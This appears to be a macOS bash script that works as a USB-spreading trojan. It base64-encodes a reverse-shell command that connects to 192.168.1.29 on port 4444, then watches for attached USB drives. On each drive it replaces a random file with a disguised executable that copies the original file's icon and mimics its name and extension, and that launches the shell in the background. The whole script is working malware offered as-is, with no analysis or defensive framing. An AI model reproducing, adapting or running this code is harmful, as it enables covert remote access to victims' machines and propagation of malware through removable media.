#!/bin/bash
encode=$(echo "bash &> /dev/tcp/192.168.1.29/4444 0>&1" | base64)
DIR=$(dirname $0)

#Checking USB Devices

var=$(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*" | wc -l )

if [[ $(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*" | wc -l) -eq 1 ]]; then
echo "USB Connected"
    name=$(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*")
	random=$(find  $name -not -path '*/\.*' -type f | python -c "import sys; import random; print(random.choice(sys.stdin.readlines()).rstrip())"); new=$(rev <<< "$random" | cut -d"." -f2- | rev)
	cat <<EOM >"$new"
	#!/bin/bash
    echo $encode | base64 -D | bash &
EOM
chmod +x "$new"
python $DIR/seticon.py "$random" "$new"
mv "$new" "$new. $(echo $random|awk -F . '{if (NF>1) {print $NF}}')"   
    echo "Injector Finished"
fi


while true; do 
if [[ $(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*" | wc -l) -gt $var ]]; then
	echo "USB Connected"
    name=$(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*")
	random=$(find  $name -not -path '*/\.*' -type f | python -c "import sys; import random; print(random.choice(sys.stdin.readlines()).rstrip())"); new=$(rev <<< "$random" | cut -d"." -f2- | rev)
	cat <<EOM >"$new"
	#!/bin/bash
    echo $encode | base64 -D | bash &
EOM
chmod +x "$new"
python $DIR/seticon.py "$random" "$new"
mv "$new" "$new. $(echo $random|awk -F . '{if (NF>1) {print $NF}}')"
    echo "Injector Finished"
	((var+=1))
elif [[ $(system_profiler SPUSBDataType | grep -o "/Volumes[^ ]*" | wc -l) -lt $var ]]; then
	echo "USB Disconnected"
	((var-=1))
fi
done